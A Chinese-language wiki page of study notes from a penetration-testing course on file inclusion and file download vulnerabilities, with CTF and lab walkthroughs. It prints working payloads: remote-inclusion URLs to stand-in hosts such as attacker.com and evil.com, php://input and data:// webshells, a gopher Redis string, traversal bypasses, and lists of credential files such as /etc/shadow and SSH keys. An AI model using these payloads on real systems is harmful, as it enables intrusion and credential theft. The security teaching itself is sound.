---
title: XD安全渗透测试课程 Day31-32 文件包含学习笔记
description: 记录 XD安全渗透测试课程 Day31-32 文件包含学习笔记，涵盖本地/远程包含原理、绕过技巧、伪协议实战、文件下载漏洞判断逻辑及 Windows/Linux
  敏感路径速查，交叉引用技术详解页
category: program-analysis
tags:
- XD安全
- 渗透测试
- 文件包含
- LFI
- RFI
- 伪协议
- 文件下载漏洞
- php://filter
- php://input
- 敏感路径
- 学习笔记
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本页面整理自 XD安全渗透测试课程 Day31-32 的学习笔记（原文发布于无名安全团队微信公众号），系统记录文件包含漏洞的成因、分类、检测方法、绕过技巧、伪协议利用链、文件下载漏洞判断逻辑，以及 Windows/Linux 系统下的敏感文件路径速查表。页面通过 `[[wikilink]]` 交叉引用知识库中已有的技术详解页，形成结构化知识网络。

> **来源声明**：作者 阿丘不皮也不卡（无名安全团队），文章仅供安全技术学习使用。

---

## 文件包含漏洞基础

### 作用与原理

文件包含的作用是**将目标文件以当前网站脚本的格式执行**（如 PHP 站点会将包含文件按 PHP 解析）。

### 各语言文件包含写法对比

| 语言 | 本地包含 | 远程包含 |
|------|----------|----------|
| PHP | `include/require` 等 | 需开启 `allow_url_include=On` |
| JSP | `<%@ include file="..." %>` | `<c:import url="..."/>` |
| ASP | `<!--#include file="..."-->` | 不支持远程 |
| ASP.NET | `Response.WriteFile` | `WebClient.DownloadFile` |
| Python | `import` / `exec(open().read())` | `urllib.request.urlopen` |
| Node.js | `require()` / `fs.readFileSync` | `http/https.get` |
| C | `#include "..."` | `#include <...>` (系统头文件) |

> **注意**：上表中仅 C 语言示例为远程包含（系统头文件），其余均为本地包含。

### PHP 四大危险函数差异

| 函数 | 错误行为 | 重复包含行为 |
|------|----------|--------------|
| `include()` | 警告，继续执行 | 可重复包含 |
| `include_once()` | 警告，继续执行 | 仅包含一次 |
| `require()` | **致命错误，终止执行** | 可重复包含 |
| `require_once()` | **致命错误，终止执行** | 仅包含一次 |

### 漏洞成因两要素

1. **可控变量**：用户输入未经过滤直接拼接进文件路径
2. **文件包含函数**：使用上述四个函数之一加载文件

---

## 漏洞检测与验证

### 基础检测流程

```text
1. 发现参数：如 ?file=show.php
2. 直接访问目标文件：/show.php → 观察返回内容
3. 若返回内容一致 → 疑似文件包含
4. 尝试包含已知文件：?file=phpinfo.php 或 ?file=../etc/passwd
5. 观察是否执行/回显 → 确认漏洞
```

### 实战案例：Bugku 文件包含

- 入口：`index.php?file=show.php`
- 直接访问 `/show.php` 返回空
- 使用伪协议读取源码：`php://filter/read=convert.base64-encode/resource=index.php`
- Base64 解码后在注释中发现 Flag

### 实战案例：i春秋靶场

1. 确认漏洞类型：参数 `file` 存在 `include`
2. 访问 `phpinfo.php` 页面内容一致 → 确认文件包含
3. 判断操作系统：Linux
4. 读取当前目录文件列表
5. 使用 `php://filter` 读取 Flag 文件并 Base64 解码

---

## 本地文件包含（LFI）与目录穿越

### 目录穿越基础

当包含文件不在当前目录时，使用 `../` 返回上级目录：

```text
?file=../../etc/passwd
?file=..\\..\\windows\\system32\\drivers\\etc\\hosts  (Windows)
```

### 常见绕过技巧（借鉴文件上传绕过思路）

| 技巧 | 示例 | 适用场景 |
|------|------|----------|
| 多层 `../` | `....//....//etc/passwd` | 过滤单层 `../` |
| URL 编码 | `%2e%2e%2f` | 过滤 `.` `/` |
| 双重编码 | `%252e%252e%252f` | 解码一次后仍含 `../` |
| 绝对路径 | `/etc/passwd` `C:\\windows\\win.ini` | 无过滤或仅过滤相对路径 |
| 协议头绕过 | `file:///etc/passwd` | PHP 配置允许 `file://` |
| 截断绕过 (PHP < 5.3.4) | `?file=../../etc/passwd%00` | `null byte` 截断后缀 |
| 路径长度截断 (Windows) | `?file=../../etc/passwd...........` | Windows 路径长度限制 (260字符) |
| `.` 目录 | `?file=./././etc/passwd` | 过滤 `../` 但未过滤 `./` |

> 详细绕过矩阵与实战 Payload 见 [[php-file-inclusion-vulnerability#绕过技巧]]、[[php伪协议与反序列化利用#绕过技巧]]。

---

## 远程文件包含（RFI）

### 启用条件

需在 `php.ini` 中同时开启：

```ini
allow_url_fopen = On
allow_url_include = On
```

可通过 `phpinfo()` 查看当前状态。

### 利用方式

```text
?file=http://attacker.com/shell.txt
?file=https://attacker.com/shell.txt?cmd=id
```

远程文件需为纯代码（无 HTML 标签），否则会作为文本输出而非执行。

### 限制与绕过

- 现代 PHP 默认关闭 `allow_url_include` → RFI 已罕见
- 可结合 `php://input`、`data://` 等伪协议实现无文件落地执行
- 详见 [[php-file-inclusion-vulnerability#远程文件包含-rfi]]、[[php伪协议与反序列化利用#phpinput-与-data]]。

---

## PHP 伪协议利用链

### 核心伪协议速查

| 协议 | 用途 | 关键参数 | 需开启配置 |
|------|------|----------|------------|
| `php://filter` | 读取源码、编码转换 | `read=convert.base64-encode/resource=xxx` | 无 |
| `php://input` | 读取 POST 原始数据 | 配合 `?file=php://input` 发送 POST Body | `allow_url_include=On` |
| `data://` | 内联数据 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` | `allow_url_include=On` |
| `file://` | 本地文件系统 | `file:///etc/passwd` | 无 |
| `phar://` | PHAR 归档反序列化 | `phar:///path/to/file.phar` | 无 (PHP >= 5.3) |
| `zip://` / `bzip2://` / `zlib://` | 压缩包读取 | `zip:///path/to.zip#file.txt` | 无 |
| `gopher://` | SSRF 攻击内网服务 | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall...` | 无 |

### 经典利用 Payload

#### 读取源码（最常用）

```text
?file=php://filter/read=convert.base64-encode/resource=index.php
?file=php://filter/read=convert.base64-encode/resource=../config.php
```

#### 无文件落地 RCE（需 `allow_url_include=On`）

```http
POST /vuln.php?file=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

```text
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id
```

#### 结合文件上传/日志投毒

- 上传含 PHP 代码的图片/日志 → 包含该文件 → RCE
- Nginx/Apache 访问日志投毒 → 包含日志文件 → RCE
- 详见 [[ctf-show-php-command-execution-bypass-techniques#nginx-日志投毒-rce]]、[[php-file-inclusion-vulnerability#日志投毒-rce]]。

### 实战案例回顾

| 靶场/题目 | 关键点 | 交叉引用 |
|-----------|--------|----------|
| Bugku 文件包含 | `php://filter` 读源码、注释泄露 Flag | — |
| i春秋 | 目录遍历 + `php://filter` 解码 Flag | — |
| 湖湘杯 WillPHP | `extract()` 变量覆盖 → `include $cfile` → `pearcmd.php` 写 Shell | [[huxiangbei-willphp-file-inclusion-writeup]] |
| Pikachu 靶场 Part4 | LFI/RFI 多层绕过、伪协议读敏感文件 | [[pikachu-target-writeup-part4]] |
| 攻防世界进阶区 | ThinkPHP5 文件包含、绕过技巧 | [[attack-defense-world-master-advanced-writeup]] |
| BUUCTF Web | 多道文件包含题目分类汇总 | [[buuctf-web-writeup-collection]] |

---

## 文件下载漏洞

### 定义与成因

**作用**：提供文件下载功能的接口（如 `?filename=xxx`）。
**漏洞成因**：后端未校验 `filename` 参数，直接拼接路径读取并返回文件流。

### 判断逻辑三步法

| 测试动作 | 响应现象 | 漏洞类型 |
|----------|----------|----------|
| 下载 `/index.php` | 文件被**解析执行**（看到 PHP 运行结果） | **文件包含漏洞 (LFI/RFI)** |
| 下载 `/index.php` | 显示**源代码**（纯文本回显） | **文件读取漏洞 (任意文件读取)** |
| 下载 `/index.php` | 浏览器**弹出下载框**，文件名为 `index.php` | **文件下载漏洞** |

> **核心区别**：文件包含会**执行**脚本；文件读取/下载仅**回显/传输**内容。

### 敏感文件下载路径速查

#### Windows 系统

| 路径 | 说明 |
|------|------|
| `C:\boot.ini` | 系统版本、启动配置 |
| `C:\Windows\System32\inetsrv\MetaBase.xml` | IIS 配置 |
| `C:\Windows\repair\sam` | 初始安装密码哈希 (需 SYSTEM 权限) |
| `C:\Program Files\mysql\my.ini` | MySQL 配置 |
| `C:\Program Files\mysql\data\mysql\user.MYD` | MySQL root 用户哈希 |
| `C:\Windows\php.ini` / `C:\php\php.ini` | PHP 配置 |
| `C:\Windows\my.ini` | MySQL 配置 (常见装在系统盘) |
| `C:\Windows\win.ini` | Windows 基础配置 |
| `C:\inetpub\wwwroot\web.config` | ASP.NET 应用配置 |
| `C:\Users\<user>\.ssh\id_rsa` | SSH 私钥 (若配置了 OpenSSH) |

#### Linux 系统

| 路径 | 说明 |
|------|------|
| `/etc/passwd` | 用户列表 (必读) |
| `/etc/shadow` | 密码哈希 (需 root) |
| `/root/.ssh/id_rsa` / `authorized_keys` | SSH 密钥 |
| `/root/.bash_history` | 历史命令 |
| `/root/.mysql_history` | MySQL 历史命令 (含明文密码) |
| `/usr/local/app/php5/lib/php.ini` | PHP 配置 (路径视安装而定) |
| `/etc/my.cnf` / `/etc/mysql/my.cnf` | MySQL 配置 |
| `/etc/httpd/conf/httpd.conf` / `/etc/apache2/apache2.conf` | Apache 配置 |
| `/etc/nginx/nginx.conf` | Nginx 配置 |
| `/proc/self/cmdline` | 当前进程启动参数 |
| `/proc/mounts` | 挂载信息 |
| `/proc/config.gz` | 内核配置 (需解压) |
| `/var/lib/mlocate/mlocate.db` | 全文件索引 (需 `locate` 工具) |
| `/WEB-INF/web.xml` | **Java Web 核心配置** (Spring/Struts 路由、Servlet 映射) |
| `/WEB-INF/classes/` | 编译后 Class 文件 (可反编译) |
| `/WEB-INF/lib/` | 依赖 Jar 包 (版本指纹、已知漏洞) |

> **Java Web 特别注意**：文件下载漏洞常通过 `../` 穿越到 `WEB-INF/` 目录下载 `web.xml`、类文件、配置文件，进而进行代码审计或寻找反序列化链。实战案例见归档文章第 4 题演示。

### 实战案例回顾

| 场景 | 关键操作 | 结果 |
|------|----------|------|
| 第一题 (PHP) | `?file=index.php` → 显示源码 → 文件读取 | 读取数据库配置文件 |
| 第二题 | 下载文件需加密参数 → 解密逻辑逆向 → 构造加密路径 | 下载任意文件 |
| 第四题 (Java) | 抓包发现 `filename=help.doc` → 修改为 `WEB-INF/web.xml` → 解析 Servlet 映射 → 下载 Class 文件审计 | 发现后续漏洞入口 |

---

## 交叉引用导航

### 核心技术详解页

- [[php-file-inclusion-vulnerability]] — PHP 文件包含漏洞完整知识页：成因、四函数差异、目录穿越、截断绕过、伪协议利用链、任意文件下载检测、敏感路径清单
- [[php伪协议与反序列化利用]] — PHP 伪协议深度解析：`php://filter`、`php://input`、`data://`、`phar://`、`gopher://` 等利用技巧、SSRF 场景、双重 URL 编码绕过、BUUCTF/攻防世界实战题目
- [[ctf-show-php-command-execution-bypass-techniques]] — CTF-show 命令执行关卡绕过技术，含 Nginx 日志投毒 RCE、无字母数字 RCE、disable_functions 绕过，部分链路依赖文件包含
- [[pikachu-target-writeup-part4]] — Pikachu 靶场 RCE、文件包含、文件上传、越权实战复现
- [[huxiangbei-willphp-file-inclusion-writeup]] — WillPHP 框架变量覆盖 + 文件包含 + `pearcmd.php` 写 Shell 完整攻击链
- [[attack-defense-world-master-advanced-writeup]] — 攻防世界进阶区文件包含绕过、ThinkPHP5 RCE 等题目
- [[buuctf-web-writeup-collection]] — BUUCTF Web 方向 47 道题目按漏洞类型分类，含文件包含专题

### XD安全课程体系页

- [[xd-security-pentest-basic-stage-notes]] — XD安全基础阶段 24 天学习笔记（Web基础、SQL注入、文件上传）
- [[xd-security-pentest-course-curriculum]] — XD安全 88 天完整课程大纲知识图谱
- [[xd-security-deserialization-xxe-notes-day37-39]] — Day37-39 反序列化/XXE 学习笔记
- [[xd-security-waf-bypass-techniques-day46-49]] — Day46-49 WAF 绕过技术体系
- [[xd-security-python-security-development-notes]] — Day76-79 Python 安全开发笔记
- [[xd-security-vulnerability-discovery-notes-day42-45]] — Day42-45 漏洞发现工具链
- [[xd-security-incident-response-notes]] — Day73-75 应急响应全流程

### 相关漏洞类型页

- [[ssrf-bypass-techniques]] — SSRF 绕过五大核心技巧，含 `gopher://` 攻击内网 FastCGI/Redis
- [[ssrf-ctf-exploitation-guide]] — Pikachu 靶场 SSRF 实战，对比 `file_get_contents` 与 `curl` 协议支持差异
- [[xxe-xml-dtd-fundamentals]] — XXE 漏洞原理、Blind XXE 带外数据外带、UTF-16BE 绕过
- [[mongodb-nosql-injection-guide]] — MongoDB NoSQL 注入四大手法
- [[mysql-dnslog-injection-loadfile-unc]] — MySQL `load_file()` + UNC 路径 DNSLog 外带
- [[race-condition-vulnerability-analysis]] — 条件竞争漏洞成因与防御

---

## 速查总结表

| 场景 | 关键函数/特征 | 核心利用链 | 必试伪协议 | 关键绕过 |
|------|---------------|------------|------------|----------|
| **LFI 读源码** | `include($file)` | `?file=php://filter/read=convert.base64-encode/resource=index.php` | `php://filter` | `../` 穿越、编码、双重编码 |
| **LFI 读敏感配置** | 同上 | `?file=../../etc/passwd` / `?file=../../WEB-INF/web.xml` | `file://` | 绝对路径、协议头 |
| **RFI Getshell** | `allow_url_include=On` | `?file=http://evil.com/shell.txt` | `http://` `https://` | 绕过 URL 校验、短标签 `<?=` |
| **无文件落地 RCE** | `allow_url_include=On` | `?file=php://input` + POST `<?php system($_GET[cmd]);?>` | `php://input` `data://` | Base64 编码 `data://` |
| **日志投毒 RCE** | 可控 User-Agent/Referer + 已知日志路径 | 投毒 → 包含日志 → RCE | `file://` | 路径爆破、通配符 |
| **PHAR 反序列化** | `phar://` + 上传点 | 上传含恶意元数据的 PHAR/JPG → `?file=phar:///upload/xxx.jpg` | `phar://` | 绕过上传检测 (GIF89a 头) |
| **文件下载漏洞** | `readfile()` `fpassthru()` `Content-Disposition` | `?filename=../../etc/passwd` | 无 (非执行) | 判断三步法、Java `WEB-INF` 穿越 |

---

## 学习建议与实战清单

1. **搭建本地靶场**：Docker 部署 `vulhub` 中的 `php:lfi`、`php:rfi`、`thinkphp:5-rce` 等环境
2. **熟练掌握 `php://filter` 编码链**：Base64、Rot13、Zlib 压缩、转换大小写等组合
3. **收集真实业务中的下载接口**：导出报表、附件下载、图片预览、API 文档导出
4. **建立敏感路径字典**：结合 [[php-file-inclusion-vulnerability#敏感文件路径清单]]、本页面 6.3 节、SecLists `LFI-Jhaddix.txt`、`LFI-gracefulsecurity-linux.txt`、`LFI-gracefulsecurity-windows.txt`
5. **实战打靶**：攻防世界、BUUCTF、CTF-show、Pikachu、XD安全课程配套靶机
6. **关注新协议/新绕过**：`phar://` 反序列化、期望回调 `expect://` (需扩展)、`input://` 变体、PHP 8.1+ 新特性利用

---

> **更新记录**：2024-01-15 初版创建，基于 XD安全 Day31-32 归档文章整理，交叉引用知识库现有 15+ 技术详解页。

## 来源

- [0x00实验室-202108-202304_091](../sources/0x00实验室-202108-202304_091.md)
